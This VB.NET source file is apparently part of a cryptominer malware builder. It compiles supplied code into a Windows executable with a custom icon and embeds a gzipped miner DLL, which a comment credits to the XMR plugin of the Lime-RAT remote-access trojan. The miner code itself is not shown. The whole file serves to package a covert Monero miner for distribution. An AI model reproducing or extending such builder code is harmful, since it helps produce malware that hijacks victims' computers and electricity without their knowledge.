Imports System.CodeDom.Compiler

Public Class Codedom
    Public Shared OK As Boolean = False
    Public Shared F As Form1
    Public Shared Sub Compiler(ByVal Path As String, ByVal Code As String, ByVal Res As String, Optional ICOPath As String = "")

        Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
        If F.txtDotNET.Text = ".NET 4.0" Then
            providerOptions.Add("CompilerVersion", "v4.0")
        Else
            providerOptions.Add("CompilerVersion", "v2.0")
        End If
        Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x86 /optimize+ /nowarn"

        If ICOPath IsNot Nothing Then
            IO.File.Copy(ICOPath, Environment.GetFolderPath(35) + "\icon.ico", True) 'codedom cant read spaces
            F.txtLog.Text = F.txtLog.Text.Insert(0, "Adding Icon..." + vbNewLine)
            OP += " /win32icon:" + Environment.GetFolderPath(35) + "\icon.ico"
        End If

        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .ReferencedAssemblies.Add("system.dll")
            .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")

            F.txtLog.Text = F.txtLog.Text.Insert(0, "Creating a DLL..." + vbNewLine)

            Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
                ' XMR DLL source code: https://github.com/NYAN-x-CAT/Lime-RAT/tree/master/Project/Plugins/XMR
                R.AddResource(F.Resources_DLL, F.GZip(My.Resources.DLL))
                R.Generate()
            End Using

            F.txtLog.Text = F.txtLog.Text.Insert(0, "Embedded Resource..." + vbNewLine)
            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + F.Resources_Parent + ".Resources")

            'Check for errors
            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox(E.ErrorText, MsgBoxStyle.Critical)
                Next
                OK = False
                Try : IO.File.Delete(Environment.GetFolderPath(35) + "\icon.ico") : Catch : End Try
                Return
            Else
                OK = True
                Try : IO.File.Delete(Environment.GetFolderPath(35) + "\icon.ico") : Catch : End Try
            End If
        End With

    End Sub


End Class
